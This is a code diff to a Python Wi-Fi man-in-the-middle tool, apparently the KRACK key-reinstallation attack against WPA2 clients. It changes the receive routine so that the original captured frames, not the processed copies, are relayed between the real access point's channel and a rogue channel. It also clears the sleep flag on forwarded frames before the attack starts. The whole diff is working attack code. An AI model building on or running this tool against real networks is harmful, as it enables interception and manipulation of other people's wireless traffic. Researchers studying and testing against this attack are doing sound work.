@@ -106,7 +106,7 @@ class MitmSocket(L2Socket):
 		else:
 			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
 		result = self._strip_fcs(p)
-		return result
+		return result, p
 
 	def close(self):
 		if self.pcap: self.pcap.close()
@@ -608,7 +608,7 @@ class KRAckAttack():
 			log(STATUS, "Got a likely group message 2", showtime=False)
 
 	def handle_rx_realchan(self):
-		p = self.sock_real.recv()
+		p, origin_p = self.sock_real.recv()
 		if p == None: 
 			return
 
@@ -670,21 +670,21 @@ class KRAckAttack():
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p)
+						self.sock_rogue.send(origin_p)
 					else:
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p)
+						self.sock_rogue.send(origin_p)
 				# Group addressed frames
 				else:
 					print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-					self.sock_rogue.send(p)
+					self.sock_rogue.send(origin_p)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
 			print_rx(INFO, "Real channel ", p)
 
 	def handle_rx_roguechan(self):
-		p = self.sock_rogue.recv()
+		p, origin_p = self.sock_rogue.recv()
 		if p == None: return
 
 		# 1. 處理來自強盜 AP 的 frames
@@ -735,9 +735,9 @@ class KRAckAttack():
 				if will_forward:
 					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
 					if client.state < ClientState.Attack_Started:
-						p.FCfield &= 0xFFEF
+						origin_p.FCfield &= 0xFFEF
 
-					self.sock_real.send(p)
+					self.sock_real.send(origin_p)
 
 
 		# 3. Always display all frames sent by or to the targeted client
